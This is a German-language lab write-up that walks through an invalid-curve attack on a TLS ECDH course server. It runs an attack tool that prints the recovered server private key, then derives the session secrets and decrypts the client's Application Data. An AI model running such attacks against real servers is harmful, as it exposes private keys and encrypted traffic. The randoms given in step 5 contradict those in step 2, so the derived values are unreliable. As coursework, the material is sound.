> 1. Betrachten Sie den durch den Angriff erzeugten Traffic in Wireshark. Durch welche Nachricht(en) äußert es sich, wenn das Tool einen Teil des Schlüssels lernt? 

```bash
$ java -jar Attacks.jar invalid_curve -connect cloud.nds.rub.de:7021 -executeAttack

Plain private key: 45920025678221661724778903394380424235512150060610104911582497586860611281771
----BEGIN PRIVATE KEY-----                                          
MEECAQAwEwYHKoZIzj0CAQYIKoZIzj0DAQcEJzAlAgEBBCBlhdBA2pVVpBpVqfWQ                                                   
LlnfZyfy1SNQtMubbhwcCFsjaw==                                                                                       
-----END PRIVATE KEY-----
```

> 2. Wie lauten die Client und Server Randoms? Tragen Sie die Werte für die späteren Berechnungen in prf.py ein.

```
Client Random: 31f7a24360b420bb3851d9d47acb933dbe70399bf6c92da33af01d4fb770e98c
Server Random: 28f6b68e678eaa98962bc34c6ae749aa1d8e7a11a89bdaf6444f574e47524401
```

> 3. Welchen Public Key hat der Client verwendet? Wie lauten die x und y Koordinate?

Public Key aus ClientKeyExchange entnehmen
```
045ecbe4d1a6330a44c8f7ef951d4bf165e6c6b721efada985fb41661bc6e7fd6c8734640c4998ff7e374b06ce1a64a2ecd82ab036384fb83d9a79b127a27d5032
```

`04` gibt an, dass die Punkte unkomprimiert sind.  
X-Koordinate: `5ecbe4d1a6330a44c8f7ef951d4bf165e6c6b721efada985fb41661bc6e7fd6c`  
Y-Koordinate: `8734640c4998ff7e374b06ce1a64a2ecd82ab036384fb83d9a79b127a27d5032`

> 4. Wie lautet das Premastersecret der Session? Verwenden Sie das Skript secp256r1.py mit dem erbeuteten privaten ECDH Schlüssel und dem öffentlichen Schlüssel des Clients. 

> Hinweise: Achten Sie darauf, wie bei ECDH Cipher Suites das Pemastersecret bestimmt wird.
> python secp256r1.py [x] [y] [scalar] 
> Die Parameter können mit ‘0x‘ als Präfix auch als Hexadezimalzahl angegeben werden. 

Mithilfe der beiden Koordinaten und des privaten Schlüssels lässt sich das PMS berechnen. Für das PMS ist nur die X-Koordinate relevant.
```bash
$ python secp256r1.py 42877656971275811310262564894490210024759287182177196162425349131675946712428 61154801112014214504178281461992570017247172004704277041681093927569603776562 45920025678221661724778903394380424235512150060610104911582497586860611281771

Computed Point: (6513557277158985704564015596039232030263345255535841621278437458181165405348,111467039410995332906994015065574724379656427246182340243801145991598376284915)
```

PMS: `6513557277158985704564015596039232030263345255535841621278437458181165405348`

> 5. Wie lautet das Mastersecret? Verwenden Sie prf.py zur Berechnung. 

PMS in Hex lautet: `0e668af327265eb3fb7a0ce18be852e1961e64fb846d5f94f5b48b29362bd4a4`  
Client Random = `3b9b7d5e60b420bb3851d9d47acb933dbe70399bf6c92da33af01d4fb770e98c`  
Server Random = `6115674b0ad86ab4927dcb4abc0370af7aadcaf8220b75dd278082ee61c21f75`  
```bash
$ python calculate-master-secret.py
4f2114e25241e030e35e1829606194a720a8adf91e8c56ed66136cf80a3fc9e3d6773853e3097f1023b6a3adb758a973
```

> 6. Wie lautet der Keyblock? Verwenden Sie prf.py zur Berechnung.

```bash
$ python calculate-keyblock.py
f9e91eee1db17caa784b0e4aab2c03a62e0f8450ffa8e2dd64f98c5ceec9cb7a3e5ab6286a68e70338fdd4483d8e4d4ba1736f0cb4cf1b5c0aecf32f2af9212d22585d2a81cc6d92
```

client_write_mac_key: `f9e91eee1db17caa784b0e4aab2c03a62e0f8450`  
server_write_mac_key: `ffa8e2dd64f98c5ceec9cb7a3e5ab6286a68e703`  
client_write_key: `38fdd4483d8e4d4ba1736f0cb4cf1b5c`  
server_write_key: `0aecf32f2af9212d22585d2a81cc6d92`  

> 7. Wie lautet der Inhalt der vom Client zuletzt gesendeten Application Data? Verwenden Sie aes.py mit den Schlüsseln aus dem Keyblock um die Nachricht zu entschlüsseln. 

Record Layer der `Application Data Protocol` Nachricht
```
4bf0b54023c29b624de9ef9c2f931efc3c4e35927878ad451c2bded9bb5b76d3cc124b249cd9ed035904f7386d2192b643cbfefa1e1d0b6ccf49fc8760169f760a65c640cb4353df8277c8532f9bca8c968fda40b3f69aa562685ab61549b7a21be2d2f266fe365d93f8021381ab0bf6
```

Der IV ist `4bf0b54023c29b624de9ef9c2f931efc`.  
Der Ciphertext lautet:
```
3c4e35927878ad451c2bded9bb5b76d3cc124b249cd9ed035904f7386d2192b643cbfefa1e1d0b6ccf49fc8760169f760a65c640cb4353df8277c8532f9bca8c968fda40b3f69aa562685ab61549b7a21be2d2f266fe365d93f8021381ab0bf6
```

```bash
$ python decrypt-application-data.py
You didn't ask for this but here you go: https://tinyurl.com/22cupf96
```
